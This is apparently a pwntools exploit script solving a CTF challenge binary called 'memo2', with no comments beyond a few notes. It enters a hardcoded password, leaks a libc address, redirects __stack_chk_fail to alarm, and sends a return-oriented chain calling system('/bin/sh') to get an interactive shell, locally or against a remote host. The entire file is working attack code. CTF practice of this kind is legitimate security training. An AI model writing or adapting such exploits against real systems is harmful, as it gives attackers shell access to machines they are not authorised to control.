#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ["/usr/bin/tmux","sp","-h"])

def debug(mallocr):
	if len(sys.argv)!=1:
		return
	text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
	gdb.attach(p, 'b *{}'.format(hex(text_base+mallocr)))
	pause()

def exp(host = "0.0.0.0", port=40312, exe = "./memo2"):
  global p
  if len(sys.argv)==1:
    p = process("./memo2_2.35-3.7")
    libc = ELF('./libc.so.6')
  
  else:
    p = remote(host, port)
    libc = ELF('./libc.so.6')
  pass

  offset = 0x160
  libclinkmap = 0x22e260 # local ubuntu20.04(2.35-0ubuntu3.7) after patchelf
  # libclinkmap = 0x2160 # local docker env
  alarm_addr = libc.symbols['alarm']
  stack_chk_fail = libc.symbols['__stack_chk_fail']
  write = libc.symbols['write']
  poprdi = 0x000000000002a3e5
  binsu = next(libc.search(b'/bin/sh\x00'))
  system = libc.symbols['system']
  ret = poprdi + 1

  p.recvuntil(b"Please enter your password: ")
  p.sendline(b"CTF_is_interesting_isn0t_it?")

  p.recvuntil(b"Your choice:")
  p.sendline(b"5")
  p.recvuntil(b"Where would you like to sign(after the content): ")
  # debug(0x1a72)
  p.sendline(str(libclinkmap+1).encode())
  p.recvuntil(b"You will overwrite some content: ")
  libc = p.recvn(5).rjust(6, b"\x00").ljust(8, b"\x00")
  libc = u64(libc)
  log.success(f"[*]libc: {hex(libc)}")
  p.recvuntil(b"name: ")
  log.success(f"6666:{hex(stack_chk_fail)}")
  log.success(f"6666:{hex(alarm_addr)}")
  log.success(f"6666:{hex(stack_chk_fail - alarm_addr)}")
  log.success(f"6666:{hex(libc - (stack_chk_fail - alarm_addr))}")
  payload = p64(libc - (stack_chk_fail - alarm_addr))[1:]
  payload = payload.ljust(0x28, b"\x90")
  payload += p64(poprdi + libc) + p64(binsu + libc) + p64(ret + libc) +p64(system + libc)
  p.sendline(payload)
  
if __name__ == '__main__':
	exp()
	p.interactive()

